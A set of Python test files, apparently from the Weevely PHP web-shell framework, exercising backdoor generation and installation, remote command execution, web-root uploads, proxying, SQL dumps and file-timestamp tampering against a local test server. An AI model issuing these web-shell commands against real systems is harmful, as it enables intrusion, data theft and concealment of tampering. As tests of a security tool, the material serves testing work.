        env_writable_url = os.path.join(conf['env_base_web_url'], conf['env_base_writable_web_dir'].replace(conf['env_base_web_dir'],''))
        env_writable_baseurl = os.path.join(env_writable_url, os.path.split(self.basedir)[-1])
        
        temp_dir = mkdtemp()
        
        self._outp('cd %s' % self.basedir)

        self.assertRegexpMatches(self._warn(':file.mount -remote-mount /nonexistant/'),modules.file.mount.WARN_HTTPFS_MOUNTPOINT)
        self.assertRegexpMatches(self._warn(':file.mount -remote-mount /etc/protocols'),modules.file.mount.WARN_HTTPFS_OUTP)


        self.assertRegexpMatches(self._warn(':file.mount -local-mount /nonexistant/'),modules.file.mount.WARN_HTTPFS_OUTP)


        self.assertRegexpMatches(self._warn(':file.mount -rpath /notinwebroot'), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        self.assertRegexpMatches(self._warn(':file.mount -rpath ./unexistant/path'), modules.file.upload2web.WARN_NOT_FOUND)
        res = self._res(':file.mount -just-install -rpath %s' % (temp_filename))
        self.assertRegexpMatches(self._warn(':file.mount -just-install -rpath %s' % (temp_filename)), modules.file.upload.WARN_FILE_EXISTS)

        self.assertRegexpMatches(self._warn(':file.mount -startpath /notinwebroot'), modules.file.upload2web.WARN_NOT_FOUND)
        self.assertRegexpMatches(self._warn(':file.mount -startpath ./unexistant/path'), modules.file.upload2web.WARN_NOT_FOUND)

        self.assertRegexpMatches(self._warn(':file.mount -just-mount localhost:9909'),modules.file.mount.WARN_HTTPFS_OUTP)
        self.assertRegexpMatches(self._warn(':file.mount -just-mount %s/nonexistant' % env_writable_baseurl),modules.file.mount.WARN_HTTPFS_OUTP)

    
#        pathenv_splitted_orig = os.environ['PATH'].split(':')
#        pathenv_splitted_orig.remove('/usr/local/bin')
#        os.environ['PATH'] = ':'.join(pathenv_splitted_orig)
#        
#        self.assertRegexpMatches(self._warn(':file.mount -just-install'), modules.file.mount.WARN_ERR_RUN_HTTPFS)

########NEW FILE########
__FILENAME__ = test_proxies
from baseclasses import FolderFSTestCase
from test import conf
import os, sys, time, urllib2, signal
sys.path.append(os.path.abspath('..'))
import modules
from random import randint

class Proxies(FolderFSTestCase):
    
    @classmethod
    def _setenv(cls):    
        FolderFSTestCase._setenv.im_func(cls)
        cls._env_newfile('web_page4.html', content=conf['web_page4_content'])
    
    def __check_urlopen(self, result=None, url=None):
        
        if not url:
            self.assertEqual(len(result),2)
            self.assertTrue(result[1])
            url = result[1] 
            
        web_page4_relative_path = os.path.join(self.basedir.replace(conf['env_base_web_dir'],''), 'web_page4.html')        
        web_page4_url = '%s%s' %  (conf['env_base_web_url'], web_page4_relative_path)

        url += '?u=%s' % web_page4_url
        page = str(urllib2.urlopen(url).read())
        self.assertTrue(page)
        self.assertRegexpMatches(page, conf['web_page4_content'])        
    
    def __check_proxyopen(self, url=None, proxyhost = '127.0.0.1', proxyport = 8081, delay=0.1):
        
        if not url:
            web_page4_relative_path = os.path.join(self.basedir.replace(conf['env_base_web_dir'],''), 'web_page4.html') 
            url = '%s%s' %  (conf['env_base_web_url'], web_page4_relative_path)
        
        proxy = urllib2.ProxyHandler({'http': '%s:%i' % (proxyhost, proxyport)})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        
        if delay:
            time.sleep(delay)
            
        page = str(urllib2.urlopen(url).read())
        
        self.assertTrue(page)
        self.assertRegexpMatches(page, conf['web_page4_content'])        
        

    def __killpid(self, pid):
        os.kill(pid, signal.SIGKILL)
        
    
    def test_phpproxy(self):
        
        
        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        
        self.__check_urlopen(self._res(":net.phpproxy"))
        self.__check_urlopen(self._res(":net.phpproxy -startpath %s/.././%s/./" % (self.dirs[0], self.dirs[0])))
        
        self.assertRegexpMatches(self._warn(":net.phpproxy -startpath unexistant"), modules.file.upload2web.WARN_NOT_FOUND)
        self.assertRegexpMatches(self._warn(":net.phpproxy -startpath /tmp/"), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        self.assertRegexpMatches(self._warn(":net.phpproxy -startpath /unexistant"), modules.file.upload2web.WARN_NOT_FOUND)
        
        
        web_base_url = '%s%s' %  (conf['env_base_web_url'], self.basedir.replace(conf['env_base_web_dir'],''))
        
        self.__check_urlopen(self._res(":net.phpproxy %s/.././%s/./inte.php" % (self.dirs[0], self.dirs[0])),'%s/%s/inte.php' % (web_base_url, self.dirs[0]))

        self.assertRegexpMatches(self._warn(":net.phpproxy unexistant/unexistant"), modules.file.upload2web.WARN_NOT_FOUND)
        self.assertRegexpMatches(self._warn(":net.phpproxy /tmp/unexistant.php"), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        self.assertRegexpMatches(self._warn(":net.phpproxy /unexistant.php"), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
     
    def test_proxy(self):
        
        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        
        proxyportstart = randint(20000,25000)
        
        proxydata = self._res(":net.proxy")
        self.__check_proxyopen()
        self.__killpid(proxydata[2])
        
        proxydata = self._res(":net.proxy -startpath %s/.././%s/./ -lport %i" % (self.dirs[0], self.dirs[0], proxyportstart))
        self.__check_proxyopen(proxyport=proxyportstart)
        self.__killpid(proxydata[2])
        
        self.assertRegexpMatches(self._warn(":net.proxy -startpath unexistant"), modules.file.upload2web.WARN_NOT_FOUND)
        self.assertRegexpMatches(self._warn(":net.proxy -startpath /tmp/"), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        self.assertRegexpMatches(self._warn(":net.proxy -startpath /unexistant"), modules.file.upload2web.WARN_NOT_FOUND)
        
        web_base_url = '%s/%s' %  (conf['env_base_web_url'].rstrip('/'), self.basedir.replace(conf['env_base_web_dir'],'').lstrip('/'))
        proxydata = self._res(":net.proxy %s/.././%s/./inte3.php -lport %i -force " % (self.dirs[0], self.dirs[0], proxyportstart+1))
        self.assertEqual(proxydata[:2], [ '%s/%s/inte3.php' % (self.basedir.rstrip('/'), self.dirs[0].rstrip('/')), '%s/%s/inte3.php' % (web_base_url.rstrip('/'), self.dirs[0].rstrip('/')) ])
        self.__check_proxyopen(proxyport=proxyportstart+1)
        self.assertRaises(urllib2.URLError,self.__check_proxyopen,proxyport=proxyportstart-1)
        self.__killpid(proxydata[2])        

        proxydata = self._res(":net.proxy %s/.././%s/./inte3.php -lport %i -force -just-install" % (self.dirs[0], self.dirs[0], proxyportstart+2))
        self.assertEqual( proxydata[:2], [ '%s/%s/inte3.php' % (self.basedir.rstrip('/'), self.dirs[0].rstrip('/')), '%s/%s/inte3.php' % (web_base_url.rstrip('/'), self.dirs[0].rstrip('/')) ])
        self.assertRaises(urllib2.URLError,self.__check_proxyopen,proxyport=proxyportstart+2)
        self.__killpid(proxydata[2])  
        
        proxydata = self._res(":net.proxy -lport %i -force -just-run %s" % (proxyportstart+3, '%s/%s/inte3.php' % (web_base_url, self.dirs[0])))
        self.assertEqual( proxydata[:2], [ '', '%s/%s/inte3.php' % (web_base_url, self.dirs[0]) ])
        self.__check_proxyopen(proxyport=proxyportstart+3)
        self.__killpid(proxydata[2])  

        self.assertRegexpMatches(self._warn(":net.proxy unexistant/unexistant"), modules.file.upload2web.WARN_NOT_FOUND)
        self.assertRegexpMatches(self._warn(":net.proxy /tmp/unexistant.php"), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        self.assertRegexpMatches(self._warn(":net.proxy /unexistant.php"), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
     
        
########NEW FILE########
__FILENAME__ = test_sessions
from baseclasses import SimpleTestCase
from test import conf
from core.utils import randstr
import os, sys, shutil
from string import ascii_lowercase
sys.path.append(os.path.abspath('..'))
import modules
from tempfile import NamedTemporaryFile, mkdtemp
import modules.generate.php
import modules.generate.img
import core.backdoor
from commands import getstatusoutput
from unittest import skipIf
from core.sessions import default_session, WARN_NOT_FOUND, WARN_BROKEN_SESS, WARN_LOAD_ERR

class Sessions(SimpleTestCase):
    
    def _install_new_bd(self, relpathfrom, phpbdname):
 
        self.__class__._env_cp(relpathfrom, phpbdname)

        web_base_url = '%s%s' %  (conf['env_base_web_url'], self.basedir.replace(conf['env_base_web_dir'],''))
        phpbd_url = os.path.join(web_base_url, phpbdname)
        
        return phpbd_url
    
    def test_sessions(self):
        
        phpbd_pwd = randstr(4)
        temp_file1 = NamedTemporaryFile(); temp_file1.close(); 
        temp_file2 = NamedTemporaryFile(); temp_file2.close(); 
        temp_file3 = NamedTemporaryFile(); temp_file2.close(); 
        
        self.assertEqual(self._res(':generate.php %s %s'  % (phpbd_pwd, temp_file1.name)),temp_file1.name)
        self.assertEqual(self._res(':generate.php %s %s'  % (phpbd_pwd, temp_file2.name)),temp_file2.name)
        self.assertEqual(self._res(':generate.php %s %s'  % (phpbd_pwd, temp_file3.name)),temp_file3.name)
        
        url1 = self._install_new_bd(temp_file1.name, '%s.php' % randstr(5))
        url2 = self._install_new_bd(temp_file2.name, '%s.php' % randstr(5))
        url3 = self._install_new_bd(temp_file3.name, '%s.php' % randstr(5))
        
        # Check current session
        curr1 = self.term.modhandler.sessions.current_session_name
        outp = self._warn(':session')
        self.assertEqual(outp, "Current session: '%s'%sLoaded: '%s'%sAvailable: '%s'%s%s" % (curr1, os.linesep, curr1, os.linesep, curr1, os.linesep, os.linesep))
        
        # Load bd1 by url
        outp = self._warn(':session %s %s' % (url1, phpbd_pwd))
        curr2 = self.term.modhandler.sessions.current_session_name
        outp = self._warn(':session')
        self.assertEqual(outp, "Current session: '%s'%sLoaded: '%s'%sAvailable: '%s'%s%s" % (curr2, os.linesep, "', '".join(sorted([curr2, curr1])), os.linesep, curr1, os.linesep,os.linesep))
        
        # Load bd2 by session file
        outp = self._warn(':session %s %s' % (url1, phpbd_pwd))
        curr2 = self.term.modhandler.sessions.current_session_name
        outp = self._warn(':session')
        self.assertEqual(outp, "Current session: '%s'%sLoaded: '%s'%sAvailable: '%s'%s%s" % (curr2, os.linesep, "', '".join(sorted([curr2, curr1])), os.linesep, curr1, os.linesep,os.linesep))
                
        # Create bd3 session file, not in session
        curr3 = '/tmp/%s.session' % randstr(5)
        session = default_session.copy()
        session['global']['url'] = url3
        session['global']['password'] = phpbd_pwd
        self.term.modhandler.sessions._dump_session(session, curr3)
        
        # Load bd3 by session file
        outp = self._warn(':session %s' % (curr3))
        outp = self._warn(':session')
        self.assertEqual(outp, "Current session: '%s'%sLoaded: '%s'%sAvailable: '%s'%s%s" % (curr3, os.linesep, "', '".join(sorted([curr2, curr3, curr1])), os.linesep, curr1, os.linesep,os.linesep))

        # Unexistant session file
        self.assertRegexpMatches(self._warn(':session /tmp/asd'), WARN_NOT_FOUND)

        # Unexpected session file
        self.assertRegexpMatches(self._warn(':session /etc/motd'), WARN_BROKEN_SESS)

        # Create session file without fields
        curr4 = '/tmp/%s.session' % randstr(5)
        open(curr4,'w').write("""[global]
url = asd
username = 
hostname = 
rcfile =""")
        
        # Broken session file
        self.assertRegexpMatches(self._warn(':session %s' % curr4), WARN_BROKEN_SESS)
        
        # Load broken session file at start
        call = "'echo'"
        command = '%s session %s %s' % (conf['cmd'], curr4, call)
        status, output = getstatusoutput(command)
        self.assertRegexpMatches(output, WARN_BROKEN_SESS)
        
########NEW FILE########
__FILENAME__ = test_set
from baseclasses import SimpleTestCase
from core.utils import randstr
from test import conf
from unittest import skipIf
import sys, os
sys.path.append(os.path.abspath('..'))


@skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
class SetSh(SimpleTestCase):

    def test_set_sh(self):
        
        module_params = [ x.dest for x in self.term.modhandler.load('shell.sh').argparser._actions if x.dest != 'help' ]

        
        self.assertRegexpMatches(self._res(':shell.sh ls'), '.\n..')

        params_print = self._warn(':help shell.sh')
        # Basic parameter output
        self.assertRegexpMatches(params_print.strip().split('\n')[-1], 'stored arguments: %s=\'.*\'' % '=\'.*\'[\s]+'.join(module_params) )
        
        # Module should have an already set vector
        self.assertRegexpMatches(params_print, 'vector=\'[\w]+\'')        

        #Use shell.php precmd
        self._res(':set shell.php -precmd echo("WEEV");')
        self.assertRegexpMatches(self._res(':shell.sh echo ILY'), 'WEEVILY')


class Set(SimpleTestCase):

        
    def test_set(self):
        
        module_params = [ x.dest for x in self.term.modhandler.load('shell.sh').argparser._actions if x.dest != 'help' ]
        
        filename_rand = randstr(4)
        filepath_rand = os.path.join(self.basedir, filename_rand)

        #Use shell.php precmd
        self._res(':set shell.php -precmd echo("WEEV");')
        self.assertRegexpMatches(self._res(':shell.php print("ILY");'), 'WEEVILY')
        
        #Reset parameters
        self._res(':set shell.sh')
        params_print = self._warn(':help shell.sh')
        self.assertRegexpMatches(params_print.strip().split('\n')[-1], 'stored arguments: %s=\'\'' % '=\'\'[\s]+'.join(module_params) )
        
        #Set wrongly parameter with choices
        #Expected arguments
        self.assertRegexpMatches(self._warn(':set shell.php -precmd'), 'argument -precmd: expected at least one argument')
        #Expected int
        self.assertRegexpMatches(self._warn(':set shell.php -debug asd'), 'argument -debug: invalid int value: \'asd\'')
        #Expected dict
        self.assertRegexpMatches(self._warn(':set shell.php -post 1'), 'argument -post: invalid dict value: \'1\'')
        #Expected list - strings are easily castable as list, so this don\'t fail. not a big deal
        #self.assertRegexpMatches(self._warn(':set bruteforce.sqlusers -wordlist {}'), 'argument -wordlist: invalid list value: \'1\'')        

########NEW FILE########
__FILENAME__ = test_set_proxy
from baseclasses import ProxyTestCase
from tempfile import NamedTemporaryFile
from os import path, remove
from commands import getstatusoutput
from test import conf
import PythonProxy
import os, sys
sys.path.append(os.path.abspath('..'))
import core.http.request
from core.sessions import default_session 

rc_content = """
:set shell.php -proxy http://localhost:%i
:shell.php echo(\'WE\'.\'EV\'.\'ELY\');
"""


class SetProxy(ProxyTestCase):
        
    def test_proxy(self):
        
        ## Runtime test
        self.assertRegexpMatches(self._warn(':set shell.php -proxy http://localhost:%i' % self.__class__.proxyport), 'proxy=\'http://localhost:%i\'' % self.__class__.proxyport)
        self.assertEqual(PythonProxy.proxy_counts,0)
        self.assertEqual(self._outp(':shell.php echo(1+1);'), '2')
        self.assertGreater(PythonProxy.proxy_counts,0)
        
        ## Rc load at start test
        PythonProxy.proxy_counts=0

        self.__class__._write_rc(rc_content % self.__class__.proxyport)
        
        # Dump session file
        session_name = self.__class__.rcpath + '.session'

        session = default_session.copy()
        session['global']['url'] = self.term.modhandler.url
        session['global']['password'] = self.term.modhandler.password
        session['global']['rcfile'] = self.__class__.rcpath
        self.term.modhandler.sessions._dump_session(session, session_name)
        
        self.assertEqual(PythonProxy.proxy_counts,0)
        call = "'echo'"
        command = '%s session %s %s' % (conf['cmd'], session_name, call)
        status, output = getstatusoutput(command)
        
        self.assertRegexpMatches(output, '\nWEEVELY')  
        self.assertGreater(PythonProxy.proxy_counts,0)
        
        # Verify that final socket is never contacted without proxy 
        # Dump new session file with unexistant php proxy
        session = default_session.copy()
        session['global']['url'] = 'http://localhost:%i/unexistant.php' % self.__class__.dummyserverport
        session['global']['password'] = self.term.modhandler.password
        session['global']['rcfile'] = self.__class__.rcpath
        self.term.modhandler.sessions._dump_session(session, session_name)
        
        PythonProxy.proxy_counts=0
        fake_url = 'http://localhost:%i/fakebd.php' % self.__class__.dummyserverport
        call = "'echo'"
        command = '%s session %s %s' % (conf['cmd'], session_name, call)
        
        self.assertEqual(PythonProxy.proxy_counts,0)
        self.assertEqual(PythonProxy.dummy_counts,0)
        status, output = getstatusoutput(command)
        self.assertGreater(PythonProxy.proxy_counts,0)
        self.assertGreater(PythonProxy.dummy_counts,0)
        
        # Count that Client never connect to final dummy endpoint without passing through proxy
        self.assertGreaterEqual(PythonProxy.proxy_counts, PythonProxy.dummy_counts)
        
        self.assertRegexpMatches(self._warn(':set shell.php -proxy wrong://localhost:%i' % self.__class__.proxyport), 'proxy=\'wrong://localhost:%i\'' % self.__class__.proxyport)
        self.assertRegexpMatches(self._warn(':shell.php echo(1+1);'), core.http.request.WARN_UNCORRECT_PROXY)
        
        
########NEW FILE########
__FILENAME__ = test_shells
import sys, os
from test import conf
sys.path.append(os.path.abspath('..'))
import modules
from unittest import skipIf
from baseclasses import SimpleTestCase

class Shells(SimpleTestCase):

    def test_php(self):
        
        self.assertEqual(self._outp(':shell.php echo(1+1);'), '2')
        self.assertRegexpMatches(self._warn(':shell.php echo(1+1)'), '%s' % modules.shell.php.WARN_TRAILING_SEMICOLON )
        self.assertRegexpMatches(self._warn(':shell.php echo(1+1); -debug 1'), 'Request[\S\s]*Response' )
        self.assertEqual(self._outp(':shell.php print($_COOKIE);'), 'Array')   
        self.assertRegexpMatches(self._warn(':shell.php print($_COOKIE); -mode Referer'), modules.shell.php.WARN_NO_RESPONSE),
        # Check if wrongly do __slacky_probe at every req    
        self.assertRegexpMatches(self._warn(':shell.php echo(1); -debug 1'), 'Request[\S\s]*Response'),   
        self.assertEqual(self._outp(':shell.php echo(2); -precmd print(1);'), '12')  
        self.assertEqual(self._outp(':shell.php -post "{ \'FIELD\':\'VALUE\' }" echo($_POST[\'FIELD\']);'), 'VALUE') 

    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_sh(self):
        self.assertEqual(self._outp(':shell.sh echo $((1+1))'), '2')
        self.assertEqual(self._outp('echo $((1+1))'), '2')
        self.assertEqual(self._outp(':shell.sh echo "$((1+1))" -vector shell_exec'), '2')
        self.assertEqual(self._outp(':shell.sh echo "$((1+1))" -vector exec'), '2')
        self.assertEqual(self._outp(':shell.sh echo "$((1+1))" -vector popen'), '2')
        #self.assertEqual(self._outp(':shell.sh echo "$((1+1))" -vector python_eval'), '2')
        #self.assertEqual(self._outp(':shell.sh echo "$((1+1))" -vector perl_system'), '2')
        self.assertEqual(self._outp(':shell.sh echo "$((1+1))" -vector proc_open'), '2')
        self.assertEqual(self._outp(':shell.sh echo "$((1+1))" -vector system'), '2')


    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")        
    def test_stderr(self):
        self.assertEqual(self._outp(':shell.sh \'(echo "VISIBLE" >&2)\''), 'VISIBLE')
        self.assertEqual(self._outp(':shell.sh \'(echo "INVISIBLE" >&2)\' -no-stderr'), '')
      
      
    def test_info(self):
        self.assertEqual(self._outp(':system.info os'), 'Linux')
        self.assertRegexpMatches(self._outp(':system.info'), 'safe_mode')
        
    def test_useragent(self):
        self.assertNotRegexpMatches(self._outp(""":shell.php "print_r(\$_SERVER['HTTP_USER_AGENT']);" """), 'urllib')
        
########NEW FILE########
__FILENAME__ = test_sql
from baseclasses import SimpleTestCase
from test import conf
from tempfile import NamedTemporaryFile
import random, string
import sys, os
sys.path.append(os.path.abspath('..'))
import modules
from unittest import skipIf

class MySql(SimpleTestCase):
    
    @skipIf(conf['test_only_dbms'] == 'postgres', "Skipping mysql tests")
    def test_query(self):

        
        user = conf['mysql_sql_user']
        pwd = conf['mysql_sql_pwd']
        
        self.assertEqual(self._res(':sql.console -user %s -pass %s -query "SELECT USER();"' % ( user, pwd ) ), [['%s@localhost' % user ]])

        self.assertEqual(self._res(':sql.console -user %s -pass %s -query "SELECT USER();"' % ( user, pwd ) ), [['%s@localhost' % user ]])
        

        self._res(':sql.console -user %s -pass %s -query "create database asd;"' % ( user, pwd ))
        
        databases = self._res(':sql.console -user %s -pass %s -query "show databases;" ' % ( user, pwd ))          
        self.assertTrue(['asd'] in databases and ['information_schema'] in databases )
      
        self._res(':sql.console -user %s -pass %s -query "drop database asd;" ' % ( user, pwd ))
                      

    @skipIf(conf['test_only_dbms'] == 'postgres' or not conf['mysql_sql_default_user'], "Skipping mysql tests")
    def test_query_fallback_user(self):
        
        default_user = conf['mysql_sql_default_user']
        user = conf['mysql_sql_user']
        pwd = conf['mysql_sql_pwd']
        
        self.assertEqual(self._res(':sql.console -query "SELECT USER();"'), [['%s@localhost' % default_user ]])
        self.assertEqual(self._res(':sql.console -host notreachable -query "SELECT USER();"' ), [['%s@localhost' % default_user ]])
       
        

    @skipIf(conf['test_only_dbms'] == 'postgres', "Skipping mysql tests")
    def test_dump(self):

        user = conf['mysql_sql_user']
        pwd = conf['mysql_sql_pwd']
        
        
        # Standard test
        self.assertRegexpMatches(self._res(':sql.dump -user %s -pass %s information_schema' % ( user, pwd ) ), "-- Dumping data for table `COLUMNS`")
        self.assertRegexpMatches(self._warn(':sql.dump -user %s -pass wrongpass information_schema' % ( user ) ), modules.sql.dump.WARN_DUMP_INCOMPLETE)
             
        # table
        self.assertRegexpMatches(self._res(':sql.dump -user %s -pass %s information_schema -table TABLES' % ( user, pwd ) ), "-- Dumping data for table `TABLES`")
         
  
        self.assertRegexpMatches(self._res(':sql.dump -user %s -pass %s information_schema -vector mysqlphpdump -table TABLES' % ( user, pwd ) ), "-- Dumping data for table `TABLES`")
        self.assertRegexpMatches(self._warn(':sql.dump -user %s -pass wrongpass information_schema  -vector mysqlphpdump -table TABLES' % ( user ) ), modules.sql.dump.WARN_DUMP_INCOMPLETE)

        # lpath
        self.assertRegexpMatches(self._warn(':sql.dump -user %s -pass %s information_schema -table TABLES -ldump /wrongpath' % ( user, pwd ) ), modules.sql.dump.WARN_DUMP_ERR_SAVING)

        # host
        self.assertRegexpMatches(self._warn(':sql.dump -user %s -pass %s information_schema -table TABLES -host wronghost' % ( user, pwd ) ), modules.sql.dump.WARN_DUMP_INCOMPLETE)



    @skipIf(conf['test_only_dbms'] == 'postgres', "Skipping mysql tests")
    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_dump(self):

        user = conf['mysql_sql_user']
        pwd = conf['mysql_sql_pwd']

        # vectors
        self.assertRegexpMatches(self._res(':sql.dump -user %s -pass %s information_schema -vector mysqldump -table TABLES' % ( user, pwd ) ), "-- Dumping data for table `TABLES`")
        self.assertRegexpMatches(self._warn(':sql.dump -user %s -pass wrongpass information_schema  -vector mysqldump -table TABLES' % ( user ) ), modules.sql.dump.WARN_DUMP_INCOMPLETE)
                   

class PGSql(SimpleTestCase):
    
    
    @skipIf(conf['test_only_dbms'] == 'mysql', "Skipping postgres tests")
    def test_query(self):
            
        user = conf['pg_sql_user']
        pwd = conf['pg_sql_pwd']

        self.assertEqual(self._res(':sql.console -user %s -pass %s -query "SELECT USER;" -dbms postgres' % ( user, pwd ) ), [[ user ]])
        self.assertRegexpMatches(self._warn(':sql.console -user %s -pass wrongpass -query "SELECT USER();" -dbms postgres' % ( user) ), modules.sql.console.WARN_CHECK_CRED)
    
        self.assertRegexpMatches(self._warn(':sql.console -user %s -pass %s -host notreachable -query "SELECT USER;" -dbms postgres' % ( user, pwd ) ), modules.sql.console.WARN_CHECK_CRED)
        
        self._res(':sql.console -user %s -pass %s -query "create database asd;" -dbms postgres' % ( user, pwd ))
        
        databases = self._res(':sql.console -user %s -pass %s -query "SELECT datname FROM pg_database;" -dbms postgres' % ( user, pwd ))          
        self.assertTrue(['asd'] in databases and ['postgres'] in databases )
      
        self._res(':sql.console -user %s -pass %s -query "drop database asd;" -dbms postgres' % ( user, pwd ))
                  
                  
                      
########NEW FILE########
__FILENAME__ = test_touch
from baseclasses import FolderFileFSTestCase
from tempfile import NamedTemporaryFile
import os

class Touch(FolderFileFSTestCase):

        
    def test_ts(self):
        
        filename1 = os.path.join(self.basedir,self.filenames[1])
        dir1 = os.path.join(self.basedir,self.dirs[1])
        
        # Set epoch, get epoch
        self.assertEqual(self._res(""":file.touch -epoch 1 %s """ % (filename1)), self._res(""":file.check %s time_epoch""" % (filename1)))

        # Set timestamp, get epoch
        # 23 Apr 2013 09:15:53 GMT -> 1366701353 
        self.assertEqual(self._res(""":file.touch -time '23 Apr 2013 09:15:53' %s """ % (filename1)),1366701353);
        self.assertEqual(self._res(""":file.check %s time_epoch""" % (filename1)),1366701353)

        # Set timestamp of dir1 as equal as filename1
        self.assertEqual(self._res(""":file.touch -ref %s %s """ % (filename1, dir1)),1366701353);
        self.assertEqual(self._res(""":file.check %s time_epoch""" % (dir1)),1366701353)

        # Set file1 with current timestamp
        self.assertNotEqual(self._res(""":file.touch %s """ % (filename1)),1366701353);
        
        # Reset file1 with oldest timestamp (dir1 one)
        self.assertEqual(self._res(""":file.touch -oldest %s """ % (filename1)),1366701353);
        
        
########NEW FILE########
__FILENAME__ = test_upload
from baseclasses import FolderFSTestCase
from test import conf
from core.utils import randstr
import os, sys
from string import ascii_lowercase
sys.path.append(os.path.abspath('..'))
import modules
from urlparse import urljoin


class FSUpload(FolderFSTestCase):
    
    
    def test_upload(self):
        
        filename_rand = randstr(4)
        filepath_rand = os.path.join(self.basedir, filename_rand)
        
        self.assertEqual(self._res(':file.upload /etc/protocols %s0'  % filepath_rand), True)
        self.assertRegexpMatches(self._warn(':file.upload /etc/protocolsA %s1'  % filepath_rand), modules.file.upload.WARN_NO_SUCH_FILE)
        self.assertRegexpMatches(self._warn(':file.upload /etc/protocols /notwritable' ), modules.file.upload.WARN_UPLOAD_FAIL)
        self.assertEqual(self._res(':file.upload /bin/true %s2'  % filepath_rand), True)
        self.assertEqual(self._res(':file.upload /bin/true %s3 -vector file_put_contents'  % filepath_rand), True)   
        self.assertEqual(self._res(':file.upload /bin/true %s4 -vector fwrite'  % filepath_rand), True)        
        self.assertEqual(self._res(':file.upload /bin/true %s5 -chunksize 2048'  % filepath_rand), True)       
        self.assertEqual(self._res(':file.upload /bin/true %s6 -content MYTEXT'  % filepath_rand), True)   
        self.assertEqual(self._outp(':file.read %s6'  % (filepath_rand)), 'MYTEXT')     
     
        # Check force
        self.assertRegexpMatches(self._warn(':file.upload /bin/true %s6 -content MYTEXT'  % filepath_rand), modules.file.upload.WARN_FILE_EXISTS)    
        self.assertEqual(self._res(':file.upload /bin/true %s6 -content MYTEXT -force'  % filepath_rand), True)


    def test_upload2web(self):
        
        filename_rand = randstr(4)
        filepath_rand = os.path.join(self.basedir, filename_rand)
        
        env_writable_base_url = urljoin(conf['env_base_web_url'], self.basedir.replace(conf['env_base_web_dir'],''))
        env_writable_url = urljoin(conf['env_base_web_url'], conf['env_base_writable_web_dir'].replace(conf['env_base_web_dir'],''))
        
        self._outp('cd %s' % self.basedir)
        self.assertEqual(self._res(':file.upload2web /etc/protocols' ), ['%s/protocols' % self.basedir, '%s/protocols' % env_writable_base_url])
        self.assertEqual(self._res(':file.upload2web /etc/protocols %s/protocols' % os.path.join(self.basedir, self.dirs[0]) ), ['%s/protocols' % os.path.join(self.basedir, self.dirs[0]), '%s/protocols' % os.path.join(env_writable_base_url, self.dirs[0])])

        # Out of web root
        
        self.assertRegexpMatches(self._warn(':file.upload2web /etc/protocols /asp' ), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)

        self.assertRegexpMatches(self._warn(':file.upload2web /etc/protocols /tmp/protocols' ), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        self.assertRegexpMatches(self._warn(':file.upload2web /etc/protocols -startpath /tmp/' ), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        
        self.assertRegexpMatches(self._warn(':file.upload2web /etc/protocols ../../../protocols' ), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        self.assertRegexpMatches(self._warn(':file.upload2web /etc/protocols -startpath ../../../' ), modules.file.upload2web.WARN_NOT_WEBROOT_SUBFOLDER)
        
        # In webroot but not writable
        self.assertRegexpMatches(self._warn(':file.upload2web /etc/protocols %s/protocols' % conf['env_base_notwritable_web_dir'] ), modules.file.upload.WARN_UPLOAD_FAIL)
        
        self.assertEqual(self._res(':file.upload2web /etc/protocols -startpath ../ -force' ), ['%s/protocols' % conf['env_base_writable_web_dir'].rstrip('/'), '%s/protocols' % env_writable_url.rstrip('/')])
        self.__class__._env_rm('%s/protocols' % conf['env_base_writable_web_dir'])
        
        self.assertEqual(self._res(':file.upload2web /bin/true -force'), ['%s/true' % self.basedir, '%s/true' % env_writable_base_url])
        self.assertEqual(self._res(':file.upload2web /bin/true -vector file_put_contents -force'), ['%s/true' % self.basedir, '%s/true' % env_writable_base_url])   
        self.assertEqual(self._res(':file.upload2web /bin/true -vector fwrite -force' ), ['%s/true' % self.basedir, '%s/true' % env_writable_base_url])        
        self.assertEqual(self._res(':file.upload2web /bin/true -chunksize 2048 -force' ), ['%s/true' % self.basedir, '%s/true' % env_writable_base_url])       
        self.assertEqual(self._res(':file.upload2web /bin/asd -content MYTEXT -force'), ['%s/asd' % self.basedir, '%s/asd' % env_writable_base_url])   
        self.assertEqual(self._outp(':file.read %s'  % ('%s/asd' % self.basedir)), 'MYTEXT')     


        self.assertEqual(self._res(':file.upload2web /etc/protocols %s' % filename_rand ), ['%s/%s' % (self.basedir,filename_rand), '%s/%s' % (env_writable_base_url,filename_rand)])

########NEW FILE########
__FILENAME__ = test_userfiles
from baseclasses import SimpleTestCase, FolderFSTestCase
from test import conf
from tempfile import NamedTemporaryFile
from unittest import skipIf
import os


class FSUserFiles(SimpleTestCase):
    
    @skipIf(not conf['permtest'] or "false" in conf['permtest'].lower(), "Skipping permission tests")
    def test_userfiles(self):
        
        expected_enum_map = {
            os.path.join(conf['permtest_home_path'],conf['permtest_path_1']): ['exists', 'readable', '', ''],
            os.path.join(conf['permtest_home_path'],conf['permtest_path_2']): ['exists', 'readable', '', '']
            }
        
        path_list = [conf['permtest_path_1'], conf['permtest_path_2'] ]
        
        temp_path = NamedTemporaryFile(); 
        temp_path.write('\n'.join(path_list)+'\n')
        temp_path.flush() 
        
        self.assertDictContainsSubset(expected_enum_map, self._res(":audit.userfiles"))
        self.assertDictContainsSubset(expected_enum_map, self._res(":audit.userfiles -pathlist \"%s\"" % str(path_list)))
        self.assertDictContainsSubset(expected_enum_map, self._res(":audit.userfiles -auto-home"))
